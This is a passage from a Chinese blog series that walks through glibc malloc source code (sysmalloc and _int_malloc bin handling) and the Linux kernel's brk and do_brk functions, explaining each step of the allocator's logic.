HEAP_MAX_SIZE); return 0; &#125; h = (heap_info *) p2; h-&gt;size = size; h-&gt;mprotect_size = size; LIBC_PROBE(memory_heap_new, 2, h, h-&gt;size); return h;&#125; 首先对需要分配的内存大小size做相应的调整。aligned_heap_area表示上一次MMAP分配后的结束地址，如果存在，就首先尝试从该地址分配大小为HEAP_MAX_SIZE的内存。MMAP最后是系统调用，对应的内核函数在《malloc源码分析—2》中已经介绍过了，这里只是一些标志位的区别。分配完后，会检查地址是否对齐，如果不对齐也是失败。如果第一次分配失败了，就会再尝试一次，这次分配HEAP_MAX_SIZE*2大小的内存，并且新内存的起始地址由内核决定。因为尝试分配了HEAP_MAX_SIZE*2大小的内存，其中必定包含了大小为HEAP_MAX_SIZE且和HEAP_MAX_SIZE对齐的内存，因此一旦分配成功，就从中截取出这部分内存。如果连第二次也分配失败了，就会通过MMAP进行第三次分配，这次只分配HEAP_MAX_SIZE大小的内存，并且起始地址由内核决定，如果又失败了就返回0。如果三面三次分配内存任何一次成功，就设置相应的可读写位置，并且返回分配区的heap_info指针。 重新回到sysmalloc中，假设分配成功，就会对刚刚分配得到的heap做相应的设置，其中ar_ptr表示所属的分配区的指针，prev表示上一个heap，所有的heap通过prev形成单向链表，然后通过set_head设置av分配区top chunk的size，这里也可以看出，对于刚分配的heap，包含了heap_info指针、top chunk、以及大于size的未被使用的部分。再接下来就要对原来的top chunk进行最后的处理，这里假设对齐，如果原top chunk的大小不够大，就将其分割成old_size + 2 * SIZE_SZ和2 * SIZE_SZ大小；如果原top chunk的大小足够大，就将其分割成old_size，2 * SIZE_SZ和2 * SIZE_SZ大小，并通过_int_free进行释放。 第二部分继续往下看sysmalloc，上面一部分代码主要是针对非主分配区的操作，下面的这段代码就是针对主分配区的操作了。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950static void * sysmalloc(INTERNAL_SIZE_T nb, mstate av) &#123; ... if (av != &amp;main_arena) &#123; ... &#125; else&#123; size = nb + mp_.top_pad + MINSIZE; if (contiguous(av)) size -= old_size; size = ALIGN_UP(size, pagesize); if (size &gt; 0) &#123; brk = (char *) (MORECORE(size)); LIBC_PROBE (memory_sbrk_more, 2, brk, size); &#125; if (brk != (char *) (MORECORE_FAILURE)) &#123; void (*hook)(void) = atomic_forced_read (__after_morecore_hook); if (__builtin_expect (hook != NULL, 0)) (*hook)(); &#125; else&#123; if (contiguous (av)) size = ALIGN_UP (size + old_size, pagesize); if ((unsigned long) (size) &lt; (unsigned long) (MMAP_AS_MORECORE_SIZE)) size = MMAP_AS_MORECORE_SIZE; if ((unsigned long) (size) &gt; (unsigned long) (nb))&#123; char *mbrk = (char *) (MMAP (0, size, PROT_READ | PROT_WRITE, 0)); if (mbrk != MAP_FAILED)&#123; brk = mbrk; snd_brk = brk + size; set_noncontiguous (av); &#125; &#125; &#125; ... &#125; ...&#125; MORECORE是一个宏定义，其最终是通过系统调用分配内存，定义在linux内核的mmap.c文件中， 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647SYSCALL_DEFINE1(brk, unsigned long, brk)&#123; unsigned long retval; unsigned long newbrk, oldbrk; struct mm_struct *mm = current-&gt;mm; unsigned long min_brk; bool populate; down_write(&amp;mm-&gt;mmap_sem); min_brk = mm-&gt;start_brk; if (brk &lt; min_brk) goto out; if (check_data_rlimit(rlimit(RLIMIT_DATA), brk, mm-&gt;start_brk, mm-&gt;end_data, mm-&gt;start_data)) goto out; newbrk = PAGE_ALIGN(brk); oldbrk = PAGE_ALIGN(mm-&gt;brk); if (oldbrk == newbrk) goto set_brk; if (brk &lt;= mm-&gt;brk) &#123; if (!do_munmap(mm, newbrk, oldbrk-newbrk)) goto set_brk; goto out; &#125; if (find_vma_intersection(mm, oldbrk, newbrk+PAGE_SIZE)) goto out; if (do_brk(oldbrk, newbrk-oldbrk) != oldbrk) goto out;set_brk: mm-&gt;brk = brk; populate = newbrk &gt; oldbrk &amp;&amp; (mm-&gt;def_flags &amp; VM_LOCKED) != 0; up_write(&amp;mm-&gt;mmap_sem); if (populate) mm_populate(oldbrk, newbrk - oldbrk); return brk;out: retval = mm-&gt;brk; up_write(&amp;mm-&gt;mmap_sem); return retval;&#125; 首先会对传入堆的新地址brk做一些检查，然后该新地址小于原本的brk，就需要通过do_munmap释放虚拟内存，以减少堆的大小；反之，就通过do_brk增加堆得大小。其中find_vma_intersection用来判断增加堆空间后，是否会占用已经被分配的虚拟内存， 1234567static inline struct vm_area_struct * find_vma_intersection(struct mm_struct * mm, unsigned long start_addr, unsigned long end_addr)&#123; struct vm_area_struct * vma = find_vma(mm,start_addr); if (vma &amp;&amp; end_addr &lt;= vma-&gt;vm_start) vma = NULL; return vma;&#125; 因为是增加堆的大小，因此只需要关心do_brk函数， 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667static unsigned long do_brk(unsigned long addr, unsigned long len)&#123; struct mm_struct *mm = current-&gt;mm; struct vm_area_struct *vma, *prev; unsigned long flags; struct rb_node **rb_link, *rb_parent; pgoff_t pgoff = addr &gt;&gt; PAGE_SHIFT; int error; len = PAGE_ALIGN(len); if (!len) return addr; flags = VM_DATA_DEFAULT_FLAGS | VM_ACCOUNT | mm-&gt;def_flags; error = get_unmapped_area(NULL, addr, len, 0, MAP_FIXED); if (error &amp; ~PAGE_MASK) return error; error = mlock_future_check(mm, mm-&gt;def_flags, len); if (error) return error; verify_mm_writelocked(mm); while (find_vma_links(mm, addr, addr + len, &amp;prev, &amp;rb_link, &amp;rb_parent)) &#123; if (do_munmap(mm, addr, len)) return -ENOMEM; &#125; if (!may_expand_vm(mm, len &gt;&gt; PAGE_SHIFT)) return -ENOMEM; if (mm-&gt;map_count &gt; sysctl_max_map_count) return -ENOMEM; if (security_vm_enough_memory_mm(mm, len &gt;&gt; PAGE_SHIFT)) return -ENOMEM; vma = vma_merge(mm, prev, addr, addr + len, flags, NULL, NULL, pgoff, NULL); if (vma) goto out; vma = kmem_cache_zalloc(vm_area_cachep, GFP_KERNEL); if (!vma) &#123; vm_unacct_memory(len &gt;&gt; PAGE_SHIFT); return -ENOMEM; &#125; INIT_LIST_HEAD(&amp;vma-&gt;anon_vma_chain); vma-&gt;vm_mm = mm; vma-&gt;vm_start = addr; vma-&gt;vm_end = addr + len; vma-&gt;vm_pgoff = pgoff; vma-&gt;vm_flags = flags; vma-&gt;vm_page_prot = vm_get_page_prot(flags); vma_link(mm, vma, prev, rb_link, rb_parent);out: perf_event_mmap(vma); mm-&gt;total_vm += len &gt;&gt; PAGE_SHIFT; if (flags &amp; VM_LOCKED) mm-&gt;locked_vm += (len &gt;&gt; PAGE_SHIFT); vma-&gt;vm_flags |= VM_SOFTDIRTY; return addr;&#125; 这段代码和第二章中分析的mmap_region函数很类似，这里简单分析如下，get_unmapped_area用来检查需要分配的虚拟内存地址是否已经被使用，find_vma_links用来查找需要插入的虚拟内存在红黑树的位置，may_expand_vm用来检查虚拟内存是否会超过系统的限制，vma_merge用来合并虚拟内存，如果不能合并，就通过slab分配一个vma，进行相应的设置，并通过vma_link插入到进程的红黑树中。 从linux的代码中回来，继续看sysmalloc，假设分配成功，会查找是否有__after_morecore_hook函数并执行，这里假设该函数指针为null。假设分配失败，则进入else部分，首先对需要分配的大小按地址对齐，并且设置分配size的最小值为MMAP_AS_MORECORE_SIZE（1MB），然后通过MMAP宏分配内存，该函数已经在《malloc源码分析—2》分析过了。这里注意，如果是通过mmap分配的内存，则设置分配区为不连续标志位。 第三部分继续往下看sysmalloc， 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566static void * sysmalloc(INTERNAL_SIZE_T nb, mstate av) &#123; ... if (av != &amp;main_arena) &#123; ... &#125; else&#123; ... if (brk != (char *) (MORECORE_FAILURE)) &#123; if (mp_.sbrk_base == 0) mp_.sbrk_base = brk; av-&gt;system_mem += size; if (brk == old_end &amp;&amp; snd_brk == (char *) (MORECORE_FAILURE)) set_head(old_top, (size + old_size) | PREV_INUSE); else if (contiguous (av) &amp;&amp; old_size &amp;&amp; brk &lt; old_end) &#123; malloc_printerr(3, &quot;break adjusted to free malloc space&quot;, brk, av); &#125; else &#123; front_misalign = 0; end_misalign = 0; correction = 0; aligned_brk = brk; if (contiguous(av)) &#123; if (old_size) av-&gt;system_mem += brk - old_end; front_misalign = (INTERNAL_SIZE_T) chunk2mem( brk) &amp; MALLOC_ALIGN_MASK; if (front_misalign &gt; 0) &#123; correction = MALLOC_ALIGNMENT - front_misalign; aligned_brk += correction; &#125; correction += old_size; end_misalign = (INTERNAL_SIZE_T) (brk + size + correction); correction += (ALIGN_UP(end_misalign, pagesize)) - end_misalign; assert(correction &gt;= 0); snd_brk = (char *) (MORECORE(correction)); if (snd_brk == (char *) (MORECORE_FAILURE)) &#123; correction = 0; snd_brk = (char *) (MORECORE(0)); &#125; else &#123; void (*hook)( void) = atomic_forced_read (__after_morecore_hook); if (__builtin_expect (hook != NULL, 0)) (*hook)(); &#125; &#125; ... &#125; &#125; &#125; ...&#125; 假设增加了主分配区的top chunk成功，则更新sbrk_base和分配区已分配的内存大小。然后，第一个判断表示，新分配的内存地址和原来的top chunk连续，并且不是通过MMAP分配的，这时只需要更新原来top chunk的大小size。第二个判断表示如果分配区的连续标志位置位，top chunk的大小大于0，但是分配的brk小于原来的top chunk结束地址，这里就判定出错了。进入第三个判断表示新分配的内存地址大于原来的top chunk的结束地址，但是不连续。这种情况下，如果分配区的连续标志位置位，则表示不是通过MMAP分配的，肯定有其他线程调用了brk在堆上分配了内存，av-&gt;system_mem += brk - old_end表示将其他线程分配的内存一并计入到该分配区分配的内存大小。然后将刚刚分配的地址brk按MALLOC_ALIGNMENT对齐。再往下就要处理地址不连续的问题了，因为地址不连续，就要放弃原来top chunk后面一部分的内存大小，并且将这一部分内存大小“补上”到刚刚分配的新内存后面。首先计算堆上补上内存后的结束地址并保存在correction中，然后调用MORECORE继续分配一次，将新分配内存的开始地址保存在snd_brk中。如果分配失败，则将correction设为0，并将snd_brk重置为原来分配的内存的结束地址，表示放弃该次补偿操作；如果分配成功，就调用__after_morecore_hook函数，这里假设该函数指针为null。 第四部分继续往下看sysmalloc， 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475static void * sysmalloc(INTERNAL_SIZE_T nb, mstate av) &#123; ... if (av != &amp;main_arena) &#123; ... &#125; else&#123; ... if (brk != (char *) (MORECORE_FAILURE)) &#123; ... if (brk == old_end &amp;&amp; snd_brk == (char *) (MORECORE_FAILURE)) ... else if (contiguous (av) &amp;&amp; old_size &amp;&amp; brk &lt; old_end) &#123; ... &#125; else &#123; ... if (contiguous(av)) &#123; ... &#125; else&#123; if (MALLOC_ALIGNMENT == 2 * SIZE_SZ) assert (((unsigned long) chunk2mem (brk) &amp; MALLOC_ALIGN_MASK) == 0); else&#123; front_misalign = (INTERNAL_SIZE_T) chunk2mem (brk) &amp; MALLOC_ALIGN_MASK; if (front_misalign &gt; 0)&#123; aligned_brk += MALLOC_ALIGNMENT - front_misalign; &#125; &#125; if (snd_brk == (char *) (MORECORE_FAILURE))&#123; snd_brk = (char *) (MORECORE (0)); &#125; &#125; if (snd_brk != (char *) (MORECORE_FAILURE)) &#123; av-&gt;top = (mchunkptr) aligned_brk; set_head(av-&gt;top, (snd_brk - aligned_brk + correction) | PREV_INUSE); av-&gt;system_mem += correction; if (old_size != 0) &#123; old_size = (old_size - 4 * SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK; set_head(old_top, old_size | PREV_INUSE); chunk_at_offset (old_top, old_size)-&gt;size = (2 * SIZE_SZ) | PREV_INUSE; chunk_at_offset (old_top, old_size + 2 * SIZE_SZ)-&gt;size = (2 * SIZE_SZ) | PREV_INUSE; if (old_size &gt;= MINSIZE) &#123; _int_free(av, old_top, 1); &#125; &#125; &#125; &#125; &#125; &#125; ...&#125; 开头的else表示分配区的连续标志没有置位，这时只要按照MALLOC_ALIGNMENT做简单的对齐就行了，如果是通过brk分配的内存，则通过MORECORE (0)得到新分配的内存的结束地址并保存在snd_brk中。再往下进入if，设置分配区的top指针为经过对齐之后的起始地址aligned_brk，设置top chunk的大小size，aligned_brk表示对齐造成的误差，correction是因为要补偿原来top chunk剩余内存造成的误差，然后设置分配区已分配的内存大小。因为不连续，最后if内是设置原top chunk的fencepost，将原来top chunk的剩余空间拆成两个SIZE_SZ*2大小的chunk，如果剩下的大小大于可分配的chunk的最小值MINSIZE，就通过_int_free释放掉整个剩余内存。 第五部分继续往下看sysmalloc最后一部分， 123456789101112131415161718192021222324static void * sysmalloc(INTERNAL_SIZE_T nb, mstate av) &#123; ... if ((unsigned long) av-&gt;system_mem &gt; (unsigned long) (av-&gt;max_system_mem)) av-&gt;max_system_mem = av-&gt;system_mem; check_malloc_state (av); p = av-&gt;top; size = chunksize(p); if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE )) &#123; remainder_size = size - nb; remainder = chunk_at_offset(p, nb); av-&gt;top = remainder; set_head(p, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : 0)); set_head(remainder, remainder_size | PREV_INUSE); check_malloced_chunk (av, p, nb); return chunk2mem(p); &#125; __set_errno(ENOMEM); return 0;&#125; 这里就是获得前面所有代码更新后的top chunk，然后从该top chunk中分配用户需要的大小chunk并返回，如果失败则返回0。 总结简单总结一下sysmalloc函数，这里不包含《malloc源码分析—2》中的代码，该代码用于初始化。首先进入sysmalloc函数就表示top chunk的空间不够了。假设当前分配区不是主分配区，就通过grow_heap增加top chunk的空间，如果失败就通过new_heap重新分配一个heap，并将该分配区的top chunk指针指向新分配的heap的空闲内存。如果当前分配区是主分配区，首先会通过brk在堆上分配内存以增加top chunk的空间，如果失败再通过MMAP分配。假设新分配内存的地址不连续，而分配区的连续标志位置位，就会继续分配内存以补偿。最后，只要分配成功，就可以从被更新的top chunk分配所需的内存。","tags":[{"name":"heap","slug":"heap","permalink":"http://yoursite.com/tags/heap/"}]},{"title":"malloc源码分析——4","date":"2018-05-21T06:41:58.000Z","path":"2018/05/21/malloc源码分析——4/","text":"malloc源码分析—_int_malloc上一章分析了_int_malloc中的fastbin、smallbin和部分largebin的处理，本章继续往下看余下的代码。最后会对整个_int_malloc做一个总结。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960static void * _int_malloc(mstate av, size_t bytes) &#123;... for (;;) &#123; int iters = 0; while ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))&#123; bck = victim-&gt;bk; if (__builtin_expect(victim-&gt;size &lt;= 2 * SIZE_SZ, 0) || __builtin_expect(victim-&gt;size &gt; av-&gt;system_mem, 0)) malloc_printerr(check_action, &quot;malloc(): memory corruption&quot;, chunk2mem(victim), av); size = chunksize(victim); if (in_smallbin_range (nb) &amp;&amp; bck == unsorted_chunks (av) &amp;&amp; victim == av-&gt;last_remainder &amp;&amp; (unsigned long) (size) &gt; (unsigned long) (nb + MINSIZE)) &#123; remainder_size = size - nb; remainder = chunk_at_offset(victim, nb); unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder; av-&gt;last_remainder = remainder; remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av); if (!in_smallbin_range(remainder_size)) &#123; remainder-&gt;fd_nextsize = NULL; remainder-&gt;bk_nextsize = NULL; &#125; set_head(victim, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : 0)); set_head(remainder, remainder_size | PREV_INUSE); set_foot(remainder, remainder_size); check_malloced_chunk (av, victim, nb); void *p = chunk2mem(victim); alloc_perturb(p, bytes); return p; &#125; unsorted_chunks (av)-&gt;bk = bck; bck-&gt;fd = unsorted_chunks (av); if (size == nb) &#123; set_inuse_bit_at_offset(victim, size); if (av != &amp;main_arena) victim-&gt;size |= NON_MAIN_ARENA; check_malloced_chunk (av, victim, nb); void *p = chunk2mem(victim); alloc_perturb(p, bytes); return p; &#125; ... &#125; ... &#125;&#125; 这部分代码的整体意思就是遍历unsortedbin，从中查找是否有符合用户要求大小的chunk并返回。第一个while循环从尾到头依次取出unsortedbin中的所有chunk，将该chunk对应的前一个chunk保存在bck中，并将大小保存在size中。如果用户需要分配的内存大小对应的chunk属于smallbin，unsortedbin中只有这一个chunk，并且该chunk属于last remainder chunk且其大小大于用户需要分配内存大小对应的chunk大小加上最小的chunk大小（保证可以拆开成两个chunk），就将该chunk拆开成两个chunk，分别为victim和remainder，进行相应的设置后，将用户需要的victim返回。如果不能拆开，就从unsortedbin中取出该chunk（victim）。再下来，如果刚刚从unsortedbin中取出的victim正好是用户需要的大小nb，就设置相应的标志位，直接返回该victim。 继续往下看_int_malloc函数，为了使整个代码结构清晰，这里保留了外层的for循环和while循环。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566static void * _int_malloc(mstate av, size_t bytes) &#123; ... for (;;) &#123; int iters = 0; while ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))&#123; ... if (in_smallbin_range(size)) &#123; victim_index = smallbin_index(size); bck = bin_at (av, victim_index); fwd = bck-&gt;fd; &#125; else &#123; victim_index = largebin_index(size); bck = bin_at (av, victim_index); fwd = bck-&gt;fd; if (fwd != bck) &#123; size |= PREV_INUSE; assert((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == 0); if ((unsigned long) (size) &lt; (unsigned long) (bck-&gt;bk-&gt;size)) &#123; fwd = bck; bck = bck-&gt;bk; victim-&gt;fd_nextsize = fwd-&gt;fd; victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize; fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; &#125; else &#123; assert((fwd-&gt;size &amp; NON_MAIN_ARENA) == 0); while ((unsigned long) size &lt; fwd-&gt;size) &#123; fwd = fwd-&gt;fd_nextsize; assert((fwd-&gt;size &amp; NON_MAIN_ARENA) == 0); &#125; if ((unsigned long) size == (unsigned long) fwd-&gt;size) fwd = fwd-&gt;fd; else &#123; victim-&gt;fd_nextsize = fwd; victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize; fwd-&gt;bk_nextsize = victim; victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; &#125; bck = fwd-&gt;bk; &#125; &#125; else victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim; &#125; mark_bin(av, victim_index); victim-&gt;bk = bck; victim-&gt;fd = fwd; fwd-&gt;bk = victim; bck-&gt;fd = victim; #define MAX_ITERS 10000 if (++iters &gt;= MAX_ITERS) break; &#125; ... &#125;&#125; 这部分代码的整体意思是如果从unsortedbin中取出的chunk不符合用户要求的大小，就将该chunk合并到smallbin或者largebin中。首先如果取出的chunk（victim）属于smallbin，就通过smallbin_index计算需要插入的位置victim_index，然后获取smallbin中对应位置的链表头指针保存在bck中，最后直接插入到smallbin中，由于smallbin中的chunk不使用fd_nextsize和bk_nextsize指针，插入操作只需要更新bk和fd指针，具体的插入操作在后面。这里需解释一下，fd_nextsize指针指向的是chunk双向链表中下一个大小不同的chunk，bk_nextsize指向的是chunk双向链表中前一个大小不同的chunk。如果取出的chunk（victim）属于largebin，通过largebin_index计算需要插入的位置victim_index，然后获取largebin链表头指针保存在bck中。如果fwd等于bck，即bck-&gt;fd=bck，则表示largebin中对应位置上的chunk双向链表为空，直接进入后面的else部分中，代码victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim表示插入到largebin中的victim是唯一的chunk，因此其fd_nextsize和bk_nextsize指针都指向自己。如果fwd不等于bck，对应的chunk双向链表存在空闲chunk，这时就要在该链表中找到合适的位置插入了。因为largebin中的chunk链表是按照chunk大小从大到小排序的，如果victim的size小于bck-&gt;bk-&gt;size即最后一个chunk的大小，则表示即将插入victim的大小在largebin的chunk双向链表中是最小的，因此要把victim插入到该链表的最后。在这种情况下，经过操作后的结果如下所示（因为我手边的画图软件有限，这里就用符号“|”隔出数组，然后从代码中摘除核心的fd_nextsize和bk_nextsize指针的修改操作，对照这两个指针的意思，很容易看懂）， 12345| fwd（头指针） | fwd-&gt;fd | ... | bck | victim（插入到末尾） |fwd-&gt;fd-&gt;bk_nextsize = victimvictim-&gt;bk_nextsize-&gt;fd_nextsize = victimvictim-&gt;fd_nextsize = fwd-&gt;fdvictim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize 如果要插入的victim的size不是最小的，就要通过一个while循环遍历找到合适的位置，这里是从双向链表头bck-&gt;fd开始遍历，利用fd_nextsize加快遍历的速度，找到第一个size&gt;=fwd-&gt;size的chunk。如果size=fwd-&gt;size，就只是改变victim以及前后相应chunk的bk、fd指针就行。这里要特别注意，先做一个假设，假设chunk双向链表中A、B、C是三个不同大小的chunk集合，A集合有A0=A1=…，B集合有B0=B1=…，C集合有C0=C1=…，然后构造chunk链表，| A0 | A1 | A2 | B0 | B1 | B2 | C0 | C1 | C2 |特别注意，在ptmalloc中，只有A0、B0、C0可以配置fd_nextsize和bk_nextsize指针，其他位置是不用配置这两个指针的。因此相同大小的chunk只有最低地址的chunk会设置fd_nextsize和bk_nextsize指针。根据这个假设，很容易知道当两个size相等时，为什么要执行fwd = fwd-&gt;fd，因为要保证插入victim的位置是相同大小的chunk的右边，即高地址的地方。插入后的链表如下， 1...| bck | victim | fwd |... 链表中所有chunk的fd_nextsize 和bk_nextsize指针不变。再往下，如果size不相等，则直接插入在fwd的左边，这样也能保证所有的fd_nextsize和bk_nextsize指针设置在相同chunk大小的最地地址处（最左边）。插入后的链表如下， 12345...| bck | victim | fwd |...victim-&gt;fd_nextsize = fwdvictim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;fwd-&gt;bk_nextsize = victimfwd-&gt;bk_nextsize-&gt;fd_nextsize = victim 再往下，mark_bin用来标识malloc_state中的binmap，标识相应位置的chunk空闲。然后就更改fd、bk指针，插入到双向链表中，这个插入操作同时适用于smallbin和largebin，因此放在这里。最后如果在unsortedbin中处理了超过10000个chunk，就直接退出循环，这里保证不会因为unsortedbin中chunk太多，处理的时间太长了。在这部分代码中，有个size |= PREV_INUSE是暂时让我比较费解的地方，经过分析后，暂时认为size |= PREV_INUSE是没必要的，虽然不会产生错误，也不会影响largebin中的排序，并且注释说这行代码能加速排序，但没看出能加速的地方，经过分析这里反而会多出一个无效的指针赋值，希望往后看代码时能解决这里的问题，或者希望有人能解答这行代码的具体作用。 回到_int_malloc函数中，继续往下看，为了使整个代码结构清晰，这里继续保留了外层的for循环。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061static void * _int_malloc(mstate av, size_t bytes) &#123; ... for (;;) &#123; ... if (!in_smallbin_range(nb)) &#123; bin = bin_at (av, idx); if ((victim = first(bin)) != bin &amp;&amp; (unsigned long) (victim-&gt;size) &gt;= (unsigned long) (nb)) &#123; victim = victim-&gt;bk_nextsize; while (((unsigned long) (size = chunksize(victim)) &lt; (unsigned long) (nb))) victim = victim-&gt;bk_nextsize; if (victim != last(bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size) victim = victim-&gt;fd; remainder_size = size - nb; unlink(av, victim, bck, fwd); if (remainder_size &lt; MINSIZE) &#123; set_inuse_bit_at_offset(victim, size); if (av != &amp;main_arena) victim-&gt;size |= NON_MAIN_ARENA; &#125; else &#123; remainder = chunk_at_offset(victim, nb); bck = unsorted_chunks (av); fwd = bck-&gt;fd; if (__glibc_unlikely(fwd-&gt;bk != bck)) &#123; errstr = &quot;malloc(): corrupted unsorted chunks&quot;; goto errout; &#125; remainder-&gt;bk = bck; remainder-&gt;fd = fwd; bck-&gt;fd = remainder; fwd-&gt;bk = remainder; if (!in_smallbin_range(remainder_size)) &#123; remainder-&gt;fd_nextsize = NULL; remainder-&gt;bk_nextsize = NULL; &#125; set_head(victim, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : 0)); set_head(remainder, remainder_size | PREV_INUSE); set_foot(remainder, remainder_size); &#125; check_malloced_chunk (av, victim, nb); void *p = chunk2mem(victim); alloc_perturb(p, bytes); return p; &#125; &#125; ... &#125;&#125; 这部分代码的整体意思就是要尝试从largebin中取出对应的chunk了。这里的idx是在前面（上一章分析的_int_malloc函数前面一部分中）根据宏largebin_index计算的。接下来就要根据idx获得largebin中的双向链表头指针bin，然后从bin-&gt;bk开始从尾到头（根据chunk大小从小到大）遍历整个双向链表，找到第一个大于用户需要分配的chunk大小nb的chunk指针victim。找到victim后，需要将其拆开成两部分，第一部分是要返回给用户的chunk，第二部分分为两种情况，如果其大小小于MINSIZE，则不能构成一个最小chunk，这种情况下就将拆开前的整个victim返回给用户；如果大于MINSIZE，就将拆开后的第二部分remainder插入到unsortedbin中，然后把第一部分victim返回给用户。 继续往下看_int_malloc函数， 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182static void * _int_malloc(mstate av, size_t bytes) &#123; ... for (;;) &#123; ... ++idx; bin = bin_at (av, idx); block = idx2block(idx); map = av-&gt;binmap[block]; bit = idx2bit(idx); for (;;) &#123; if (bit &gt; map || bit == 0) &#123; do &#123; if (++block &gt;= BINMAPSIZE) /* out of bins */ goto use_top; &#125; while ((map = av-&gt;binmap[block]) == 0); bin = bin_at (av, (block &lt;&lt; BINMAPSHIFT)); bit = 1; &#125; while ((bit &amp; map) == 0) &#123; bin = next_bin(bin); bit &lt;&lt;= 1; assert(bit != 0); &#125; victim = last(bin); if (victim == bin) &#123; av-&gt;binmap[block] = map &amp;= ~bit; bin = next_bin(bin); bit &lt;&lt;= 1; &#125; else &#123; size = chunksize(victim); assert((unsigned long ) (size) &gt;= (unsigned long ) (nb)); remainder_size = size - nb; unlink(av, victim, bck, fwd); if (remainder_size &lt; MINSIZE) &#123; set_inuse_bit_at_offset(victim, size); if (av != &amp;main_arena) victim-&gt;size |= NON_MAIN_ARENA; &#125; else &#123; remainder = chunk_at_offset(victim, nb); bck = unsorted_chunks (av); fwd = bck-&gt;fd; if (__glibc_unlikely(fwd-&gt;bk != bck)) &#123; errstr = &quot;malloc(): corrupted unsorted chunks 2&quot;; goto errout; &#125; remainder-&gt;bk = bck; remainder-&gt;fd = fwd; bck-&gt;fd = remainder; fwd-&gt;bk = remainder; if (in_smallbin_range(nb)) av-&gt;last_remainder = remainder; if (!in_smallbin_range(remainder_size)) &#123; remainder-&gt;fd_nextsize = NULL; remainder-&gt;bk_nextsize = NULL; &#125; set_head(victim, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : 0)); set_head(remainder, remainder_size | PREV_INUSE); set_foot(remainder, remainder_size); &#125;check_malloced_chunk (av, victim, nb); void *p = chunk2mem(victim); alloc_perturb(p, bytes); return p; &#125; &#125; ... &#125;&#125; 这一部分的整体意思是，前面在largebin中寻找特定大小的空闲chunk，如果没找到，这里就要遍历largebin中的其他更大的chunk双向链表，继续寻找。开头的++idx就表示，这里要从largebin中下一个更大的chunk双向链表开始遍历。ptmalloc中用一个bit表示malloc_state的bins数组中对应的位置上是否有空闲chunk，bit为1表示有，为0则没有。ptmalloc通过4个block（一个block 4字节）一共128个bit管理bins数组。因此，代码中计算的block表示对应的idx属于哪一个block，map就表是block对应的bit组成的二进制数字。接下来进入for循环，如果bit &gt; map，表示该map对应的整个block里都没有大于bit位置的空闲的chunk，因此就要找下一个block。因为后面的block只要不等于0，就肯定有空闲chunk，并且其大小大于bit位置对应的chunk，下面就根据block，取出block对应的第一个双向链表的头指针。这里也可以看出，设置map和block也是为了加快查找的速度。如果遍历完所有block都没有空闲chunk，这时只能从top chunk里分配chunk了，因此跳转到use_top。如果有空闲chunk，接下来就通过一个while循环依次比较找出到底在哪个双向链表里存在空闲chunk，最后获得空闲chunk所在的双向链表的头指针bin和位置bit。接下来，如果找到的双向链表又为空，则继续前面的遍历，找到空闲chunk所在的双向链表的头指针bin和位置bit。如果找到的双向链表不为空，就和上面一部分再largebin中找到空闲chunk的操作一样了，这里就不继续分析了。 继续往下看_int_malloc， 1234567891011121314151617181920212223242526272829303132333435363738394041static void * _int_malloc(mstate av, size_t bytes) &#123; ... for (;;) &#123; ... use_top: victim = av-&gt;top; size = chunksize(victim); if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE )) &#123; remainder_size = size - nb; remainder = chunk_at_offset(victim, nb); av-&gt;top = remainder; set_head(victim, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : 0)); set_head(remainder, remainder_size | PREV_INUSE); check_malloced_chunk (av, victim, nb); void *p = chunk2mem(victim); alloc_perturb(p, bytes); return p; &#125; else if (have_fastchunks(av)) &#123; malloc_consolidate(av); if (in_smallbin_range(nb)) idx = smallbin_index(nb); else idx = largebin_index(nb); &#125; else &#123; void *p = sysmalloc(nb, av); if (p != NULL) alloc_perturb(p, bytes); return p; &#125; &#125;&#125; 这里就是_int_malloc的最后一部分了，这部分代码的整体意思分为三部分，首先从top chunk中尝试分配内存；如果失败，就检查fastbin中是否有空闲内存了（其他线程此时可能将释放的chunk放入fastbin中了），如果不空闲，就合并fastbin中的空闲chunk并放入smallbin或者largebin中，然后会回到_int_malloc函数中最前面的for循环，重新开始查找空闲chunk；如果连fastbin中都没有空闲内存了，这时只能通过sysmalloc从系统分配内存了，该函数前面几章里已经分析过了一部分了，下一章会再次进入这个函数进行分析。这部分代码很简单，关键函数前面几章都碰到过了，这里就不详细分析了。 